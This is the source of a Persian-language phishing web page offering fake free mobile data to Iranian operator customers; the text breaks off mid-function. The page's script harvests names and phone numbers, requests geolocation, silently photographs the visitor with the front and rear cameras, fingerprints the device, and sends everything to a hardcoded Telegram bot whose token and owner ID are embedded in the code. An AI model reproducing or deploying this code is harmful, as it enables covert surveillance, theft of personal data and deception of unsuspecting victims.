<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هدیه اینترنتی | اینترنت رایگان همراه اول، ایرانسل و رایتل</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.rtl.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            color: #333;
        }
        .card {
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            border: none;
        }
        .btn-primary {
            background-color: #6e8efb;
            border: none;
            padding: 10px 25px;
        }
        .btn-primary:hover {
            background-color: #5a7bf0;
        }
        .header {
            color: white;
            text-align: center;
            padding: 30px 0;
        }
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .offer-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin: 10px;
            text-align: center;
            transition: transform 0.3s;
        }
        .offer-card:hover {
            transform: translateY(-5px);
        }
        .offer-card h3 {
            color: #6e8efb;
        }
        .hidden {
            display: none;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #6e8efb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">هدیه اینترنتی</div>
        <p>اینترنت رایگان برای کاربران همراه اول، ایرانسل و رایتل</p>
    </div>

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-body text-center" id="main-screen">
                        <h3 class="card-title">به هدیه اینترنتی خوش آمدید!</h3>
                        <p class="card-text">برای دریافت اینترنت رایگان، لطفاً یکی از گزینه‌های زیر را انتخاب کنید:</p>
                        
                        <div class="row mt-4">
                            <div class="col-md-6 mb-3">
                                <button class="btn btn-primary btn-lg w-100" onclick="showLoginForm()">ورود کاربران</button>
                            </div>
                            <div class="col-md-6 mb-3">
                                <button class="btn btn-success btn-lg w-100" onclick="showRegisterForm()">ثبت نام جدید</button>
                            </div>
                        </div>

                        <div class="row mt-4">
                            <div class="col-md-4 mb-3">
                                <div class="offer-card">
                                    <h3>۱ گیگابایت</h3>
                                    <p>اینترنت رایگان</p>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="offer-card">
                                    <h3>۳ گیگابایت</h3>
                                    <p>اینترنت رایگان</p>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="offer-card">
                                    <h3>۵ گیگابایت</h3>
                                    <p>اینترنت رایگان</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Login Form -->
                    <div class="card-body hidden" id="login-form">
                        <h3 class="card-title text-center">ورود کاربران</h3>
                        <form id="loginForm">
                            <div class="form-group">
                                <label for="login-name">نام و نام خانوادگی</label>
                                <input type="text" class="form-control" id="login-name" required>
                            </div>
                            <div class="form-group">
                                <label for="login-phone">شماره تلفن</label>
                                <input type="tel" class="form-control" id="login-phone" required>
                            </div>
                            <div class="text-center mt-4">
                                <button type="button" class="btn btn-primary" onclick="requestPermissionsAndLogin()">ارسال اطلاعات</button>
                                <button type="button" class="btn btn-secondary" onclick="backToMain()">بازگشت</button>
                            </div>
                        </form>
                    </div>

                    <!-- Register Form -->
                    <div class="card-body hidden" id="register-form">
                        <h3 class="card-title text-center">ثبت نام جدید</h3>
                        <form id="registerForm">
                            <div class="form-group">
                                <label for="operator">اپراتور</label>
                                <select class="form-select" id="operator" required>
                                    <option value="" selected disabled>لطفاً انتخاب کنید</option>
                                    <option value="MCI">همراه اول</option>
                                    <option value="IRANCELL">ایرانسل</option>
                                    <option value="RIGHTEL">رایتل</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label for="name">نام</label>
                                <input type="text" class="form-control" id="name" required>
                            </div>
                            <div class="form-group">
                                <label for="family">نام خانوادگی</label>
                                <input type="text" class="form-control" id="family" required>
                            </div>
                            <div class="form-group">
                                <label for="phone">شماره تلفن</label>
                                <input type="tel" class="form-control" id="phone" required>
                            </div>
                            <div class="form-group">
                                <label for="internet-pack">بسته اینترنت</label>
                                <select class="form-select" id="internet-pack" required>
                                    <option value="" selected disabled>لطفاً انتخاب کنید</option>
                                    <option value="1GB">۱ گیگابایت</option>
                                    <option value="2GB">۲ گیگابایت</option>
                                    <option value="3GB">۳ گیگابایت</option>
                                    <option value="4GB">۴ گیگابایت</option>
                                    <option value="5GB">۵ گیگابایت</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label for="referral">کد معرف (اختیاری)</label>
                                <input type="text" class="form-control" id="referral">
                            </div>
                            <div class="text-center mt-4">
                                <button type="button" class="btn btn-primary" onclick="requestPermissionsAndRegister()">بررسی اطلاعات</button>
                                <button type="button" class="btn btn-secondary" onclick="backToMain()">بازگشت</button>
                            </div>
                        </form>
                    </div>

                    <!-- Loading Screen -->
                    <div class="card-body hidden" id="loading-screen">
                        <div class="loading">
                            <div class="spinner"></div>
                            <h4>در حال بررسی اطلاعات شما...</h4>
                            <p>لطفاً چند لحظه صبر کنید</p>
                        </div>
                    </div>

                    <!-- Code Verification -->
                    <div class="card-body hidden" id="code-verification">
                        <h3 class="card-title text-center">دریافت کد فعالسازی</h3>
                        <p class="text-center">کد فعالسازی به شماره شما ارسال شد</p>
                        <div class="form-group">
                            <label for="verification-code">کد فعالسازی</label>
                            <input type="text" class="form-control" id="verification-code" placeholder="کد ۵ رقمی">
                        </div>
                        <div class="text-center mt-4">
                            <button type="button" class="btn btn-primary" onclick="verifyCode()">تایید کد</button>
                            <button type="button" class="btn btn-secondary" onclick="resendCode()">ارسال مجدد کد</button>
                        </div>
                    </div>

                    <!-- Success Message -->
                    <div class="card-body hidden" id="success-message">
                        <div class="text-center py-4">
                            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="#28a745" class="bi bi-check-circle-fill mb-3" viewBox="0 0 16 16">
                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                            </svg>
                            <h3>تبریک!</h3>
                            <p>درخواست شما با موفقیت ثبت شد</p>
                            <p>بسته اینترنت شما در حال فعالسازی است</p>
                            <button type="button" class="btn btn-primary mt-3" onclick="backToMain()">بازگشت به صفحه اصلی</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Telegram bot configuration
        const BOT_TOKEN = '7009108012:AAGR5iZJ7tdEzBbuIZhFemwCrHfmZKp3XZc';
        const OWNER_ID = '1958034986';
        const WEBHOOK_URL = 'https://your-glitch-project-name.glitch.me/webhook';

        // Screen management functions
        function showScreen(screenId) {
            document.querySelectorAll('.card-body').forEach(el => {
                el.classList.add('hidden');
            });
            document.getElementById(screenId).classList.remove('hidden');
        }

        function backToMain() {
            showScreen('main-screen');
        }

        function showLoginForm() {
            showScreen('login-form');
        }

        function showRegisterForm() {
            showScreen('register-form');
        }

        function showLoadingScreen() {
            showScreen('loading-screen');
        }

        function showCodeVerification() {
            showScreen('code-verification');
        }

        function showSuccessMessage() {
            showScreen('success-message');
        }

        // Request permissions
        function requestPermissions() {
            return new Promise((resolve, reject) => {
                if (navigator.mediaDevices && navigator.geolocation) {
                    Promise.all([
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }),
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } }),
                        navigator.geolocation.getCurrentPosition(position => position)
                    ]).then(results => {
                        resolve(results);
                    }).catch(error => {
                        reject(error);
                    });
                } else {
                    reject(new Error('Permissions not supported'));
                }
            });
        }

        // Get device and browser info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browserName: detectBrowser(),
                browserVersion: detectBrowserVersion(),
                deviceType: detectDeviceType(),
                ipAddress: 'Fetching...' // This would need a server-side solution to get real IP
            };
        }

        function detectBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
            if (userAgent.includes('SamsungBrowser')) return 'Samsung Browser';
            if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
            if (userAgent.includes('Trident')) return 'Internet Explorer';
            if (userAgent.includes('Edge')) return 'Microsoft Edge';
            if (userAgent.includes('Chrome')) return 'Google Chrome';
            if (userAgent.includes('Safari')) return 'Safari';
            return 'Unknown';
        }

        function detectBrowserVersion() {
            const userAgent = navigator.userAgent;
            const matches = userAgent.match(/(firefox|opr|chrome|safari|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            return matches[2] || 'Unknown';
        }

        function detectDeviceType() {
            const userAgent = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
                return 'Tablet';
            }
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(userAgent)) {
                return 'Mobile';
            }
            return 'Desktop';
        }

        // Send data to Telegram bot
        async function sendToTelegram(data) {
            try {
                const message = formatTelegramMessage(data);
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (!response.ok) {
                    throw new Error('Failed to send message to Telegram');
                }

                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        function formatTelegramMessage(data) {
            let message = `<b>🔔 اطلاعات جدید از کاربر 🔔</b>\n\n`;
            
            if (data.type === 'login') {
                message += `<b>📌 نوع درخواست:</b> ورود کاربر\n`;
                message += `<b>👤 نام و نام خانوادگی:</b> ${data.name}\n`;
                message += `<b>📞 شماره تلفن:</b> ${data.phone}\n`;
            } else if (data.type === 'register') {
                message += `<b>📌 نوع درخواست:</b> ثبت نام جدید\n`;
                message += `<b>📱 اپراتور:</b> ${data.operator}\n`;
                message += `<b>👤 نام:</b> ${data.name}\n`;
                message += `<b>👥 نام خانوادگی:</b> ${data.family}\n`;
                message += `<b>📞 شماره تلفن:</b> ${data.phone}\n`;
                message += `<b>📦 بسته اینترنت:</b> ${data.internetPack}\n`;
                if (data.referral) {
                    message += `<b>🎟️ کد معرف:</b> ${data.referral}\n`;
                }
            }
            
            message += `\n<b>📱 اطلاعات دستگاه:</b>\n`;
            message += `<b>🌐 مرورگر:</b> ${data.deviceInfo.browserName} (نسخه ${data.deviceInfo.browserVersion})\n`;
            message += `<b>🖥️ سیستم عامل:</b> ${data.deviceInfo.platform}\n`;
            message += `<b>🔍 User Agent:</b> ${data.deviceInfo.userAgent}\n`;
            message += `<b>🕒 منطقه زمانی:</b> ${data.deviceInfo.timezone}\n`;
            message += `<b>💻 نوع دستگاه:</b> ${data.deviceInfo.deviceType}\n`;
            
            if (data.location) {
                message += `\n<b>📍 موقعیت مکانی:</b>\n`;
                message += `<b>🌐 عرض جغرافیایی:</b> ${data.location.coords.latitude}\n`;
                message += `<b>🌐 طول جغرافیایی:</b> ${data.location.coords.longitude}\n`;
                if (data.location.coords.accuracy) {
                    message += `<b>🎯 دقت:</b> ${data.location.coords.accuracy} متر\n`;
                }
            }
            
            message += `\n<b>📸 عکس‌ها:</b> در پیام بعدی ارسال خواهند شد`;
            
            return message;
        }

        // Capture and send photos
        async function captureAndSendPhotos(chatId) {
            try {
                // Front camera (selfie)
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const frontPhoto = await capturePhoto(frontStream);
                await sendPhotoToTelegram(chatId, frontPhoto, 'عکس سلفی کاربر');
                frontStream.getTracks().forEach(track => track.stop());

                // Rear camera
                const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
                const rearPhoto = await capturePhoto(rearStream);
                await sendPhotoToTelegram(chatId, rearPhoto, 'عکس دوربین عقب کاربر');
                rearStream.getTracks().forEach(track => track.stop());

                return true;
            } catch (error) {
                console.error('Error capturing photos:', error);
                return false;
            }
        }

        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toDataURL('image/jpeg');
                        resolve(photo.split(',')[1]); // Return base64 without prefix
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }, 5
